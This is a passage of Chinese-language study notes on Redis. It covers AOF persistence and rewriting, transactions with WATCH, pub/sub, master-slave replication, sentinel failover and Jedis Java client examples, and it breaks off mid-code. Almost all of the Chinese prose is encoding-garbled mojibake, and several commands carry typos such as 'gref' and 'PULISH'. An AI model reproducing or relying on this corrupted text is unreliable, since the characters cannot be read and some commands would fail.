é™¤æœ«å°¾è¡Œçš„FLUSHALLï¼Œå†æ¬¡è¿æ¥æ•°æ®åº“å³å¯è®¿é—®ã€‚ ä¸¤è€…å¯ä»¥å…±å­˜ï¼Œä¼˜å…ˆæ‰¾aofï¼Œå¦‚æœaofæœ‰ä¿®æ”¹ä¸ºä¸èƒ½è¯†åˆ«çš„å­—ç¬¦ï¼Œå¼€å¯redisæ—¶ä¼šè¢«æ‹’ç»ã€‚ è¿™æ—¶ï¼Œå½“å‰æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ªredis-check-aofï¼Œä½¿ç”¨å‘½ä»¤ï¼š redis-check-aof --fix appendonly.aof continue?[y/N]:y å‘½ä»¤ä¼šåˆ é™¤ä¸ç¬¦åˆè¯­æ³•è§„èŒƒçš„å­—æ®µã€‚ rewriteAOFé‡‡ç”¨æ–‡ä»¶è¿½åŠ æ–¹å¼ï¼Œæ–‡ä»¶ä¼šè¶Šæ¥è¶Šå¤§ä¸ºé¿å…å‡ºç°æ­¤ç§æƒ…å†µï¼Œæ–°å¢äº†é‡å†™æœºåˆ¶ï¼Œå½“AOFæ–‡ä»¶çš„å¤§å°è¶…è¿‡æ‰€è®¾å®šçš„é˜ˆå€¼æ—¶ï¼ŒRediså°±ä¼šå¯åŠ¨AOFæ–‡ä»¶çš„å†…å®¹å‹ç¼©ï¼Œåªä¿ç•™å¯ä»¥æ¢å¤æ•°æ®çš„æœ€å°æŒ‡ä»¤é›†.å¯ä»¥ä½¿ç”¨bgrewriteaof é‡å†™åŸç†ï¼š AOFæ–‡ä»¶æŒç»­å¢é•¿è€Œè¿‡å¤§æ—¶ï¼Œä¼šforkå‡ºä¸€æ¡æ–°è¿›ç¨‹æ¥å°†æ–‡ä»¶é‡å†™ï¼ˆä¹Ÿæ˜¯å…ˆå†™ä¸´æ—¶æ–‡ä»¶æœ€åå†renameï¼‰ï¼Œéå†æ–°è¿›ç¨‹çš„å†…å­˜ä¸­æ•°æ®ï¼Œæ¯æ¡è®°å½•æœ‰ä¸€æ¡çš„set è¯­å¥ã€‚é‡å†™aofæ–‡ä»¶çš„æ“ä½œï¼Œå¹¶æ²¡æœ‰è¯»å–æ—§çš„aofæ–‡ä»¶ï¼Œè€Œæ˜¯å°†æ•´ä¸ªå†…å­˜ä¸­çš„æ•°æ®åº“å†…å®¹ç”¨å‘½ä»¤çš„æ–¹å¼é‡å†™äº†ä¸€ä¸ªæ–°çš„aofæ–‡ä»¶ï¼Œè¿™ç‚¹å’Œå¿«ç…§æœ‰ç‚¹ç±»ä¼¼ã€‚ è§¦å‘æœºåˆ¶ï¼š Redisä¼šè®°å½•ä¸Šæ¬¡é‡å†™æ—¶çš„AOFå¤§å°ï¼Œé»˜è®¤é…ç½®æ˜¯å½“AOFæ–‡ä»¶å¤§å°æ˜¯ä¸Šæ¬¡rewriteåå¤§å°çš„ä¸€å€ä¸”æ–‡ä»¶å¤§äº64Mæ—¶è§¦å‘ã€‚ auto-aof-rewrite-percentage 100 ä¸€å€ auto-aof-rewrite-min-size 64mb ä¼˜åŠ¿æ¯ç§’åŒæ­¥ï¼šappendfsync always åŒæ­¥æŒä¹…åŒ– æ¯æ¬¡å‘ç”Ÿæ•°æ®å˜æ›´ä¼šè¢«ç«‹å³è®°å½•åˆ°ç£ç›˜ æ€§èƒ½è¾ƒå·®ä½†æ•°æ®å®Œæ•´æ¯”è¾ƒå¥½ æ¯ä¿®æ”¹åŒæ­¥ï¼šappendfsync everysec å¼‚æ­¥æ“ä½œï¼Œæ¯ç§’è®°å½• å¦‚æœä¸€ç§’å†…å®•æœºï¼Œæœ‰æ•°æ®ä¸¢å¤±ã€‚ ä¸åŒæ­¥ï¼šappendfsync no ä»ä¸åŒæ­¥ åŠ£åŠ¿ç›¸åŒæ•°æ®é›†çš„æ•°æ®è€Œè¨€aofæ–‡ä»¶è¦è¿œå¤§äºrdbæ–‡ä»¶ï¼Œæ¢å¤é€Ÿåº¦æ…¢ä¸rdb aofè¿è¡Œæ•ˆç‡è¦æ…¢ä¸rdbï¼Œæ¯ç§’åŒæ­¥ç­–ç•¥è¾ƒå¥½ï¼Œä¸åŒæ­¥æ•ˆç‡å’Œrdbç›¸åŒ AOF ç½‘ç»œåè®®æ ¼å¼ _________________ å‘½ä»¤è¯·æ±‚ ________________ çš„å‘½ä»¤å†…å®¹ ____________________ | å®¢æˆ·ç«¯ | __________&gt; | æœåŠ¡å™¨ | __________&gt;| AOFæ–‡ä»¶ | |_________________| |________________| |___________________| aofæ–‡ä»¶æ—¶ä¸€ä¸ªåªè¿›è¡Œè¿½åŠ çš„æ—¥å¿—æ–‡ä»¶ Rediså¯ä»¥åœ¨AoFæ–‡ä»¶ä½“ç§¯å˜å¾—è¿‡å¤§æ—¶ï¼Œè‡ªåŠ¨åœ°åœ¨åå°å¯¹AOFè¿›è¡Œé‡å†™ å¯¹äºç›¸åŒçš„æ•°æ®é›†æ¥è¯´ï¼ŒAOFæ–‡ä»¶çš„ä½“ç§¯é€šå¸¸è¦å¤§äºRDBæ–‡ä»¶çš„ä½“ç§¯ æ ¹æ®æ‰€ä½¿ç”¨çš„fsyncç­–ç•¥ï¼ŒAOFçš„é€Ÿåº¦å¯èƒ½ä¼šæ…¢äºRDB æ€»ç»“ RDBæŒä¹…åŒ–æ–¹å¼èƒ½å¤Ÿåœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”èƒ½å¯¹ä½ çš„æ•°æ®è¿›è¡Œå¿«ç…§å­˜å‚¨ AOPæŒä¹…åŒ–æ–¹å¼è®°å½•æ¯æ¬¡å¯¹æœåŠ¡å™¨å†™çš„æ“ä½œï¼Œå½“æœåŠ¡å™¨é‡å¯çš„æ—¶å€™å›é‡æ–°æ‰§è¡Œè¿™äº›å‘½ä»¤æ¥å›å¤åŸå§‹çš„æ•°æ®ï¼ŒAOPå‘½ä»¤ä»¥redisåè®®è¿½åŠ ä¿å­˜æ¯æ¬¡å†™çš„æ“ä½œåˆ°æ–‡ä»¶æœ«å°¾. Redisè¿˜èƒ½å¯¹AOFæ–‡ä»¶è¿›è¡Œåå°é‡å†™ï¼Œä½¿å¾—AOFæ–‡ä»¶çš„ä½“ç§¯ä¸è‡³äºè¿‡å¤§ åªåšç¼“å­˜ï¼šå¦‚æœä½ åªå¸Œæœ›ä½ çš„æ•°æ®åœ¨æœåŠ¡å™¨è¿è¡Œçš„æ—¶å€™å­˜åœ¨ï¼Œä½ ä¹Ÿå¯ä»¥ä¸ä½¿ç”¨ä»»ä½•æŒä¹…åŒ–æ–¹å¼. åŒæ—¶å¼€å¯ä¸¤ç§æŒä¹…åŒ–æ–¹å¼.åœ¨è¿™ç§æƒ…å†µä¸‹,å½“redisé‡å¯çš„æ—¶å€™ä¼šä¼˜å…ˆè½½å…¥AOFæ–‡ä»¶æ¥æ¢å¤åŸå§‹çš„æ•°æ®,å› ä¸ºåœ¨é€šå¸¸æƒ…å†µä¸‹AOFæ–‡ä»¶ä¿å­˜çš„æ•°æ®é›†è¦æ¯”RDBæ–‡ä»¶ä¿å­˜çš„æ•°æ®é›†è¦å®Œæ•´. RDBçš„æ•°æ®ä¸å®æ—¶,åŒæ—¶ä½¿ç”¨ä¸¤è€…æ—¶æœåŠ¡å™¨é‡å¯ä¹Ÿåªä¼šæ‰¾AOFæ–‡ä»¶, å»ºè®®ä¸è¦åªä½¿ç”¨AOF,å› ä¸ºRDBæ›´é€‚åˆäºå¤‡ä»½æ•°æ®åº“(AOFåœ¨ä¸æ–­å˜åŒ–ä¸å¥½å¤‡ä»½), å¿«é€Ÿé‡å¯,è€Œä¸”ä¸ä¼šæœ‰AOFå¯èƒ½å­˜åœ¨çš„bug,ç•™ç€ä½œä¸ºä¸€ä¸ªä¸‡ä¸€çš„æ‰‹æ®µ. äº‹åŠ¡ å¯ä»¥ä¸€æ¬¡æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œæœ¬è´¨æ˜¯ä¸€ç»„å‘½ä»¤çš„é›†åˆã€‚ä¸€ä¸ªäº‹åŠ¡ä¸­çš„æ‰€æœ‰å‘½ä»¤éƒ½ä¼šåºåˆ—åŒ–ï¼ŒæŒ‰é¡ºåºåœ°ä¸²è¡ŒåŒ–æ‰§è¡Œè€Œä¸ä¼šè¢«å…¶ä»–å‘½ä»¤æ’å…¥ï¼Œä¸è®¸åŠ å¡ èƒ½åšä»€ä¹ˆï¼Ÿä¸€ä¸ªé˜Ÿåˆ—ä¸­ï¼Œä¸€æ¬¡æ€§çš„ã€é¡ºåºæ€§ã€æ’ä»–æ€§çš„æ‰§è¡Œä¸€ç³»åˆ—å‘½ä»¤ å¸¸ç”¨å‘½ä»¤ DISCARD å–æ¶ˆäº‹åŠ¡ï¼Œæ”¾å¼ƒæ‰§è¡Œäº‹åŠ¡å—å†…çš„æ‰€æœ‰å‘½ä»¤ã€‚ EXEC æ‰§è¡Œæ‰€æœ‰äº‹åŠ¡å—å†…çš„å‘½ä»¤ã€‚ MULTI æ ‡è®°ä¸€ä¸ªäº‹åŠ¡å—çš„å¼€å§‹ã€‚ UNWATCH å–æ¶ˆ WATCH å‘½ä»¤å¯¹æ‰€æœ‰ key çš„ç›‘è§†ã€‚ WATCH key [key â€¦] ç›‘è§†ä¸€ä¸ª(æˆ–å¤šä¸ª) key ï¼Œå¦‚æœåœ¨äº‹åŠ¡æ‰§è¡Œä¹‹å‰è¿™ä¸ª(æˆ–è¿™äº›) key è¢«å…¶ä»–å‘½ä»¤æ‰€æ”¹åŠ¨ï¼Œé‚£ä¹ˆäº‹åŠ¡å°†è¢«æ‰“æ–­ã€‚ æ­£å¸¸æ‰§è¡ŒMULTI ç›¸å½“ä¸ ä¸€ä¸ªæ–°çš„è´­ç‰©è½¦ï¼Œæ¯è¾“å…¥ä¸€æ¡å‘½ä»¤è¿”å›QUEUEDç›¸å½“äºåŠ å…¥è´­ç‰©è½¦ï¼ŒEXECæ‰§è¡Œå‘½ä»¤ç›¸å½“äºç»“è´¦ã€‚ æ”¾å¼ƒäº‹åŠ¡åœ¨äº‹åŠ¡æ²¡æœ‰EXECä¹‹å‰è°ƒç”¨DISCARD å…¨ä½“è¿åå¦‚æœæœ‰ä¸€ä¸ªæŒ‡ä»¤ä¸èƒ½æ­£å¸¸è¿è¡Œï¼ˆç¼–è¯‘å‡ºé”™ï¼‰ï¼Œäº‹åŠ¡EXECä¼šæŠ¥é”™ å†¤å¤´å€ºä¸»è¿è¡Œæ—¶å‡ºé”™çš„å‘½ä»¤ä¸ä¼šæ‰§è¡Œï¼Œè€Œå…¶ä»–å‘½ä»¤ä»ç„¶ä¼šæ”¾è¡Œã€‚ Redisæ˜¯å¦æ”¯æŒäº‹åŠ¡ï¼Ÿ æ˜¯éƒ¨åˆ†æ”¯æŒã€‚ watchç›‘æ§ æ‚²è§‚é”(Pessimistic Lock) æˆ‘å¯¹è¿™ä¸ªäº‹æƒ…çš„å‘å±•å¾ˆæ‚²è§‚ï¼Œæ¯æ¬¡å»æ‹¿æ•°æ®çš„æ—¶å€™éƒ½è®¤ä¸ºåˆ«äººä¼šä¿®æ”¹ï¼Œä¸ºäº†é¿å…å‡ºäº‹ï¼ŒæŠŠæ•´å¼ è¡¨é”äº†ï¼Œ è¡¨é”ï¼Œå¹¶å‘æ€§æœ€å·®ï¼Œä¸€è‡´æ€§æœ€å¥½ã€‚ ä¹è§‚é”(Optimistic Lock) æˆ‘è®¤ä¸ºè¿™ä¸ªäº‹æ²¡æœ‰äººä¼šå»å¹²ï¼Œä¸ä¼šä¸Šé”ï¼Œä¹è§‚é”åœ¨æ¯æ¡è®°å½•çš„åé¢åŠ ä¸€ä¸ªversionç‰ˆæœ¬å·å­—æ®µã€‚ ä¹è§‚é”ç­–ç•¥ï¼šæäº¤ç‰ˆæœ¬å¿…é¡»å¤§äºè®°å½•å½“å‰ç‰ˆæœ¬æ‰èƒ½æ‰§è¡Œã€‚ åœ¨è°ƒç”¨MULTIä¹‹å‰ï¼Œå…ˆè°ƒç”¨ WATCH + KEY UNWATCHå–æ¶ˆæ‰€æœ‰keyçš„ç›‘æ§ æœ‰åŠ å¡ç¯¡æ”¹ï¼Œç›‘æ§äº†keyï¼Œkeyè¢«ä¿®æ”¹äº†ï¼Œäº‹åŠ¡å°†è¢«æ‰“æ–­ï¼Œè°ƒç”¨UNWATCHå†æ‰§è¡Œä¸€æ¬¡ é˜¶æ®µå¼€å¯ï¼šä»¥MULTIå¼€å§‹ä¸€ä¸ªäº‹åŠ¡ å…¥é˜Ÿï¼šå°†å¤šä¸ªå‘½ä»¤å…¥é˜Ÿåˆ°äº‹åŠ¡ä¸­ï¼Œæ¥åˆ°è¿™äº›å‘½ä»¤å¹¶ä¸ä¼šç«‹å³æ‰§è¡Œï¼Œè€Œæ˜¯æ”¾åˆ°ç­‰å¾…æ‰§è¡Œçš„äº‹åŠ¡é˜Ÿåˆ—é‡Œé¢ã€‚ æ‰§è¡Œï¼šç”±EXECå‘½ä»¤è§¦å‘äº‹åŠ¡ æ€»ç»“watchæŒ‡ä»¤ï¼Œç±»ä¼¼ä¹è§‚é”ï¼Œäº‹åŠ¡æäº¤æ—¶ï¼Œå¦‚æœkeyçš„å€¼å·²è¢«åˆ«çš„å®¢æˆ·ç«¯æ”¹å˜ï¼Œæ¯”å¦‚æŸä¸ªlistå·²è¢«åˆ«çš„å®¢æˆ·ç«¯push/popè¿‡äº†ï¼Œæ•´ä¸ªäº‹åŠ¡é˜Ÿåˆ—éƒ½ä¸ä¼šæ‰§è¡Œã€‚ é€šè¿‡watchå‘½ä»¤åœ¨äº‹åŠ¡æ‰§è¡Œä¹‹å‰ç›‘æ§äº†å¤šä¸ªkeysï¼Œå€˜è‹¥åœ¨watchä¹‹åæœ‰ä»»ä½•keyçš„å€¼å‘ç”Ÿäº†å˜åŒ–ï¼ŒEXECå‘½ä»¤æ‰§è¡Œçš„äº‹åŠ¡éƒ½å°†è¢«æ”¾å¼ƒï¼ŒåŒæ—¶è¿”å›Nullmulti-bulkåº”ç­”ä»¥é€šçŸ¥è°ƒç”¨è€…äº‹åŠ¡æ‰§è¡Œå¤±è´¥ã€‚ ç‰¹æ€§ï¼šå•ç‹¬çš„éš”ç¦»æ“ä½œï¼šäº‹åŠ¡ä¸­çš„æ‰€æœ‰å‘½ä»¤éƒ½ä¼šåºåˆ—åŒ–ã€æŒ‰é¡ºåºçš„æ‰§è¡Œã€‚äº‹åŠ¡åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œä¸ä¼šè¢«å…¶ä»–å®¢æˆ·ç«¯å‘é€æ¥çš„è¯·æ±‚æ‰€æ‰“æ–­ã€‚ æ²¡æœ‰éš”ç¦»çº§åˆ«çš„æ¦‚å¿µï¼šé˜Ÿåˆ—ä¸­çš„å‘½ä»¤æ²¡æœ‰æäº¤ä¹‹å‰éƒ½ä¸ä¼šå®é™…çš„è¢«æ‰§è¡Œï¼Œå› ä¸ºäº‹åŠ¡æäº¤å‰ä»»ä½•æŒ‡ä»¤éƒ½ä¸ä¼šè¢«å®é™…æ‰§è¡Œï¼Œä¹Ÿå°±ä¸å­˜åœ¨â€œäº‹åŠ¡å†…çš„æŸ¥è¯¢è¦çœ‹åˆ°äº‹åŠ¡é‡Œçš„æ›´æ–°ï¼Œåœ¨äº‹åŠ¡å¤–æŸ¥è¯¢ä¸èƒ½çœ‹åˆ°â€è¿™ä¸ªé—®é¢˜ã€‚ ä¸ä¿è¯åŸå­æ€§ï¼šredisåŒä¸€ä¸ªäº‹åŠ¡ä¸­å¦‚æœæœ‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œå…¶åçš„å‘½ä»¤ä»ç„¶ä¼šè¢«æ‰§è¡Œï¼Œæ²¡æœ‰å›æ»šã€‚ æ¶ˆæ¯è®¢é˜…å‘å¸ƒæ˜¯ä»€ä¹ˆï¼Ÿ è¿›ç¨‹é—´çš„ä¸€ç§æ¶ˆæ¯é€šä¿¡æ¨¡å¼ï¼šå‘é€è€…(pub)å‘é€æ¶ˆæ¯ï¼Œè®¢é˜…è€…(sub)æ¥æ”¶æ¶ˆæ¯ ä¸‹å›¾å±•ç¤ºäº†é¢‘é“channel1ï¼Œä»¥åŠè®¢é˜…è¿™ä¸ªé¢‘é“çš„ä¸‰ä¸ªå®¢æˆ·ç«¯â€”-client2å’Œclient5ã€client1ä¹‹é—´çš„å…³ç³» å½“æœ‰æ–°æ¶ˆæ¯é€šè¿‡PUBLISHå‘½ä»¤å‘é€ç»™é¢‘é“channel1æ—¶ï¼Œè¿™ä¸ªæ¶ˆæ¯å°±ä¼šå‘é€ç»™è®¢é˜…å®ƒçš„ä¸‰ä¸ªå®¢æˆ·ç«¯ ä¸‹è¡¨åˆ—å‡ºäº† redis å‘å¸ƒè®¢é˜…å¸¸ç”¨å‘½ä»¤ï¼š å‘½ä»¤ æè¿° PSUBSCRIBE pattern [pattern â€¦] è®¢é˜…ä¸€ä¸ªæˆ–å¤šä¸ªç¬¦åˆç»™å®šæ¨¡å¼çš„é¢‘é“ã€‚ PUBSUB subcommand [argument [argument â€¦]] æŸ¥çœ‹è®¢é˜…ä¸å‘å¸ƒç³»ç»ŸçŠ¶æ€ã€‚ PUBLISH channel message å°†ä¿¡æ¯å‘é€åˆ°æŒ‡å®šçš„é¢‘é“ã€‚ PUNSUBSCRIBE [pattern [pattern â€¦]] é€€è®¢æ‰€æœ‰ç»™å®šæ¨¡å¼çš„é¢‘é“ã€‚ SUBSCRIBE channel[channel â€¦] è®¢é˜…ç»™å®šçš„ä¸€ä¸ªæˆ–å¤šä¸ªé¢‘é“çš„ä¿¡æ¯ã€‚ UNSUBSCRIBE[channel [channel â€¦]] æŒ‡é€€è®¢ç»™å®šçš„é¢‘é“ã€‚ SUBSCRIBE c1 c2 PULISH c1 message PSUBSCRIBE new* PULISH new4 message ä¸»ä»å¤åˆ¶ ä¸»æœºæ•°æ®æ›´æ–°åæ ¹æ®é…ç½®å’Œç­–ç•¥ï¼Œè‡ªåŠ¨åŒæ­¥åˆ°å¤‡æœºçš„master/slaveæœºåˆ¶ï¼ŒMasterä»¥å†™ä¸ºä¸»ï¼ŒSlaveä»¥è¯»ä¸ºä¸»ã€‚ åœ¨/myredisä¸‹ï¼šcp redis.conf redis6379.conf cp redis.conf redis6380.conf cp redis.conf redis6381.conf ä¿®æ”¹é…ç½®æ–‡ä»¶ vim redis6379.conf pidfile /var/run/redis.pid -&gt; /var/run/redis6379.pid port 6379 logfile &quot;&quot; -&gt; logfile &quot;6379.log&quot; å¤‡ä»½ dbfilename dump.rdb -&gt; dump6379.rdb 6380,6381 ä»¥æ­¤ä¸ºä¾‹ åˆ†åˆ«å¯åŠ¨ redis-server /myredis/redis6379.conf redis-cli -p 6379 æ£€æŸ¥æ˜¯å¦å¯åŠ¨ ps -ef|gref redis ä½¿ç”¨å‘½ä»¤ info replicationæŸ¥çœ‹ä¿¡æ¯,ä»–ä»¬çš„è§’è‰²éƒ½æ˜¯master role:master åœ¨ä¸»æœºï¼ˆ6379ï¼‰ä¸‹å¾€æ•°æ®åº“è®¾å€¼ set k1 v1 set k2 v2 set k3 v3 åœ¨ä»æœºï¼ˆ6380,6381ï¼‰åˆ†åˆ«ä½¿ç”¨SLAVEOFå‘½ä»¤ SLAVEOF 127.0.0.1 6379 è¿™æ—¶å†å¾€ä¸»æœº6379è®¾å€¼ set k4 v4 ä»æœºå¯ä»¥è·å–å€¼ get k4 &quot;v4&quot; get k1 &quot;v1&quot; å†æ¬¡ä½¿ç”¨å‘½ä»¤ info replicationæŸ¥çœ‹ä¿¡æ¯ 6379ä¸»æœºä¸‹å¤šäº†ä¸¤ä¸ªå¥´éš¶ï¼š6380,6381 6780ã€6781çš„è§’è‰²å˜æˆäº†å¥´éš¶ã€‚ å¦‚æœä»æœºå°è¯•å†™å…¥æ•°æ®ã€‚ä¼šå‡ºé”™ã€‚å› ä¸ºMasterä»¥å†™ä¸ºä¸»ï¼ŒSlaveä»¥è¯»ä¸ºä¸» å¦‚æœä¸»æœºSHUTDOWNæ­»äº†ï¼Œè°ƒç”¨ä»æœºçš„ info replication master_link_status: ç”±upå˜æˆäº†down ä»æœºåœ¨åŸåœ°å¾…å‘½ å¦‚æœä¸»æœºé‡æ–°è¿æ¥å›æ¥äº†ï¼Œå¹¶è®¾å€¼ set k7 v7 ä»æœºä¾ç„¶å¯ä»¥è·å–k7çš„å€¼ get k7 &quot;v7&quot; å¦‚æœä»æœºé€€å‡ºå¹¶é‡æ–°è¿æ¥roleè§’è‰²ä¼šå˜æˆmasterï¼Œå¹¶ä¸”ä¼šä¸¢å¤±é€€å‡ºæœŸé—´çš„æ•°æ®, è°ƒç”¨SLAVEOF 127.0.0.1 6379å°±å¯ä»¥æ¢å¤è¿æ¥å¹¶è·å–åˆ°åŸæ¥ä¸¢å¤±çš„å€¼ æ¯æ¬¡ä¸masteræ–­å¼€ä¹‹åï¼Œéƒ½éœ€è¦é‡æ–°è¿æ¥ï¼Œé™¤éé…ç½®è¿›redis.conf è–ªç«ç›¸ä¼  å»ä¸­å¿ƒåŒ– ä¸Šä¸€ä¸ªSlaveå¯ä»¥æ˜¯ä¸‹ä¸€ä¸ªslaveçš„Masterï¼ŒSlaveåŒæ ·å¯ä»¥æ¥æ”¶å…¶ä»–slavesçš„è¿æ¥å’ŒåŒæ­¥è¯·æ±‚ï¼Œé‚£ä¹ˆè¯¥slaveä½œä¸ºäº†é“¾æ¡ä¸­çš„ä¸‹ä¸€ä¸ªçš„masterï¼Œå¯ä»¥æœ‰æ•ˆå‡è½»masterçš„å†™å‹åŠ›ã€‚ ä¸­é€”å˜æ›´è½¬å‘ï¼šä¼šæ¸…é™¤ä¹‹å‰çš„æ•°æ®ï¼Œé‡æ–°å»ºç«‹æ‹·è´æœ€æ–°çš„ Slaveof æ–°ä¸»åº“IP æ–°ä¸»åº“ç«¯å£ ä¾‹å¦‚81æ˜¯80çš„ä»æœºï¼Œ80æ˜¯79çš„ä»æœºï¼Œé‚£ä¹ˆ80æ˜¯79çš„å¥´éš¶ï¼Œ80è¿˜æ˜¯å¥´éš¶ï¼Œ81æ˜¯80çš„å¥´éš¶ã€‚ åå®¢ä¸ºä¸»ä¸€ä¸»äºŒä»†é‡Œï¼Œä¸»æœºæŒ‚äº†ï¼Œä»æœºä½¿ç”¨å‘½ä»¤ï¼š SLAVEOF no one å½“å‰ä»æœºçš„è§’è‰²å°±å˜æˆäº†ä¸»æœºï¼Œå…¶ä»–ä»æœºéœ€è¦è°ƒç”¨ï¼š Slaveof æ–°ä¸»åº“IP æ–°ä¸»åº“ç«¯å£ //ä½¿å½“å‰æ•°æ®åº“åœæ­¢ä¸å…¶ä»–æ•°æ®åº“åŒæ­¥ï¼Œè½¬æˆç»„æ•°æ®åº“ã€‚ æ‰èƒ½è·Ÿéšæ–°ä¸»æœºã€‚ å¤åˆ¶åŸç† Slaveå¯åŠ¨æˆåŠŸè¿æ¥åˆ°masteråä¼šå‘é€ä¸€ä¸ªsyncå‘½ä»¤ Masteræ¥åˆ°å‘½ä»¤å¯åŠ¨åå°çš„å­˜ç›˜è¿›ç¨‹ï¼ŒåŒæ—¶æ”¶é›†æ‰€æœ‰æ¥å—åˆ°çš„ç”¨äºä¿®æ”¹æ•°æ®é›†å‘½ä»¤ï¼Œåœ¨åå°è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œmasterå°†ä¼ é€æ•´ä¸ªæ•°æ®æ–‡ä»¶åˆ°slaveï¼Œä»¥å®Œæˆä¸€æ¬¡å®Œå…¨åŒæ­¥ å…¨é‡å¤åˆ¶ï¼šè€ŒslaveæœåŠ¡åœ¨æ¥æ”¶åˆ°æ•°æ®åº“æ–‡ä»¶æ•°æ®åï¼Œå°†å…¶å­˜ç›˜å¹¶åŠ è½½åˆ°å†…å­˜ä¸­ã€‚ å¢é‡å¤åˆ¶ï¼šMasterç»§ç»­å°†æ–°çš„æ‰€æœ‰æ”¶é›†åˆ°çš„ä¿®æ”¹å‘½ä»¤ä¾æ¬¡ä¼ ç»™slaveï¼Œå®ŒæˆåŒæ­¥ ä½†æ˜¯åªè¦æ˜¯é‡æ–°è¿æ¥masterï¼Œä¸€æ¬¡å®Œå…¨åŒæ­¥ï¼ˆå…¨é‡å¤åˆ¶ï¼‰å°†ä¼šè¢«è‡ªåŠ¨æ‰§è¡Œã€‚ å“¨å…µæ¨¡å¼ åå®¢ä¸ºä¸»çš„è‡ªåŠ¨ç‰ˆï¼Œèƒ½å¤Ÿåå°ç›‘æ§ä¸»æœºæ˜¯å¦æ•…éšœï¼Œå¦‚æœæ•…éšœäº†æ ¹æ®æŠ•ç¥¨æ•°è‡ªåŠ¨å°†ä»åº“è½¬æ¢ä¸ºä¸»åº“ å¯åŠ¨åœ¨/myredisä¸‹é¢åˆ›å»ºä¸€ä¸ªsentinel.confæ–‡ä»¶ touch sentinel.conf vim sentinel.conf ä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š ä¸€ç»„ sentinel.conf å¯ä»¥ç›‘æ§å¤šä¸ªMaster sentinel monitor è¢«ç›‘æ§æ•°æ®åº“åå­—(è‡ªå·±èµ·åå­—) 127.0.0.1 6379 1 //æ•°å­—1 è¡¨ç¤ºä¸»æœºæŒ‚æ‰åsalveæŠ•ç¥¨çœ‹è®©è°æ¥æ›¿æˆä¸ºä¸»æœºï¼Œå¾—ç¥¨æ•°å¤šå°‘åæˆä¸ºä¸»æœº å¯åŠ¨redisï¼š redis-sentinel /myredis/sentinel.conf ä¸»æœºæ–­å¼€ä¹‹åï¼Œå“¨å…µç›‘æ§åˆ°äº†ï¼Œå°±å¼€å§‹æŠ•ç¥¨ï¼Œå¦‚æœä¸¤ä¸ªä»æœºä¸€äººä¸€ç¥¨ï¼Œå°±ä¼šé‡æ–°æŠ•ç¥¨ï¼Œ ç¥¨æ•°é«˜çš„ä»æœºæ›¿æ¢ä¸»æœºï¼Œå…¶ä»–ä»æœºéƒ½è·Ÿéšè¿™ä¸ªæ–°ä¸»æœºã€‚ æ–­å¼€çš„ä¸»æœºå›æ¥ä¹‹åå˜æˆäº†ä»æœºï¼Œå¹¶è·Ÿéšæ–°ä¸»æœºã€‚ å¤åˆ¶çš„ç¼ºç‚¹ç”±äºæ‰€æœ‰çš„å†™æ“ä½œéƒ½æ˜¯å…ˆåœ¨Masterä¸Šæ“ä½œï¼Œç„¶ååŒæ­¥æ›´æ–°åˆ°Slaveä¸Šï¼Œæ‰€ä»¥ä»MasteråŒæ­¥å¸¦Slaveæœºå™¨æœ‰ä¸€å®šçš„å»¶è¿Ÿï¼Œå½“ç³»ç»Ÿå¾ˆç¹å¿™çš„æ—¶å€™ï¼Œå»¶è¿Ÿé—®é¢˜ä¼šæ›´åŠ ä¸¥é‡ï¼ŒSlaveæœºå™¨æ•°é‡çš„å¢åŠ ä¹Ÿä¼šä½¿è¿™ä¸ªé—®é¢˜æ›´åŠ ä¸¥é‡ã€‚ Jedisæµ‹è¯•è”é€š å…ˆå¯åŠ¨ åœ¨/usr/local/binä¸‹ï¼š $ redis-server /myredis/redis.conf $ redis-cli -p 6379 Javaï¼š ä¾èµ–ï¼š &lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-pool2 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt; &lt;version&gt;2.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; /** * @Author: Wizard * @Date: 2020/6/29 18:33 */ public class TestPing { public static void main(String[] args) { Jedis jedis = new Jedis(&quot;127.0.0.1&quot;, 6379); System.out.println(jedis.ping()); } } ------ PONG API /** * @Author: Wizard * @Date: 2020/6/29 18:33 */ public class TestAPI { public static void main(String[] args) { Jedis jedis = new Jedis(&quot;127.0.0.1&quot;, 6379); jedis.set(&quot;k1&quot;, &quot;v2&quot;); jedis.get(&quot;k1&quot;); Set&lt;String&gt; keys = jedis.keys(&quot;*&quot;); //äº‹åŠ¡ Transaction multi = jedis.multi(); multi.set(&quot;k2&quot;, &quot;v2&quot;); // multi.exec(); multi.discard(); } } äº‹åŠ¡ /** * @Author: Wizard * @Date: 2020/6/29 20:04 */ public class TestTX { public static void main(String[] args) throws InterruptedException { TestTX test = new TestTX(); boolean b = test.transMethod(); System.out.println(b); } public boolean transMethod() throws InterruptedException { Jedis jedis = new Jedis(&quot;127.0.0.1&quot;, 6379); int balance;//å¯ç”¨ä½™é¢ int debt;//æ¬ é¢ int amtToSubtract = 10;//å®åˆ·é¢åº¦ jedis.watch(&quot;balance&quot;); //å…¶ä»–ç¨‹åºæ‰§è¡Œ // Thread.sleep(3000); //jedis.set(&quot;balance&quot;, &quot;5&quot;); balance = Integer.parseInt(jedis.get(&quot;balance&quot;)); if (balance &lt; amtToSubtract) { jedis.unwatch(); System.out.println(&quot;modify&quot;); return false; } return true; } } ä¸»ä» /** * @Author: Wizard * @Date: 2020/6/29 20:04 */ public class TestMS { public static void main(String[] args) { Jedis jedis_M = new Jedis(&quot;127.0.0.1&quot;, 6379); Jedis jedis_S = new Jedis(&quot;127.0.0.1&quot;, 6380); jedis_S.slaveof(&quot;127.0.0.1&quot;, 6379); jedis_M.set(&quot;class&quot;, &quot;1&quot;); System.out.println(jedis_S.get(&quot;class&quot;)); } } æ±  /** * @Author: Wizard * @Date: 2020/6/29 20:29 */ public class 